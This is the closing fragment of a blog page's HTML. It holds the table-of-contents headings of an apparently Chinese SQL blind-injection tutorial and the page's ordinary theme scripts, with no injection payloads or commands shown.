href="#首先我们先查询一下版本-，测试一下我们是否能用盲注的方式获得数据"><span class="toc_mobile_items-number">1.4.</span> <span class="toc_mobile_items-text">首先我们先查询一下版本**，测试一下我们是否能用盲注的方式获得数据**</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#在这里在注释后面的语句的时候突然发现了一个问题"><span class="toc_mobile_items-number">1.5.</span> <span class="toc_mobile_items-text">在这里在注释后面的语句的时候突然发现了一个问题</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#爆破数据库第一位"><span class="toc_mobile_items-number">1.6.</span> <span class="toc_mobile_items-text">爆破数据库第一位</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#substr-函数-ascii-函数-limit-函数讲解"><span class="toc_mobile_items-number">1.7.</span> <span class="toc_mobile_items-text">substr()函数  ascii()函数 limit()函数讲解**</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#regexp（）-函数"><span class="toc_mobile_items-number">1.8.</span> <span class="toc_mobile_items-text">regexp（） 函数</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#利用ord（）和mid（）数获取users-表的内容"><span class="toc_mobile_items-number">1.9.</span> <span class="toc_mobile_items-text">利用ord（）和mid（）数获取users 表的内容**</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#报错注入"><span class="toc_mobile_items-number">1.10.</span> <span class="toc_mobile_items-text">报错注入</span></a></li></ol></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>$(function () {
+  $('span.katex-display').wrap('<div class="katex-wrap"></div>')
+})</script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="/js/third-party/fireworks.js"></script><script src="/js/nightshift.js"></script><script id="ribbon" src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/js/piao.js"></script><script color="0,0,255" opacity="0.7" zindex="-1" count="99" src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/js/canvas-nest.js"></script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true; // make power mode colorful
+POWERMODE.shake = true; // turn off shake
+document.body.addEventListener('input', POWERMODE);
+</script><script src="/js/tw_cn.js"></script><script>translateInitilization()
+
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@1.2.2/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script><script>const observer = lozad(); // lazy loads elements with default selector as '.lozad'
+observer.observe();</script></body></html>
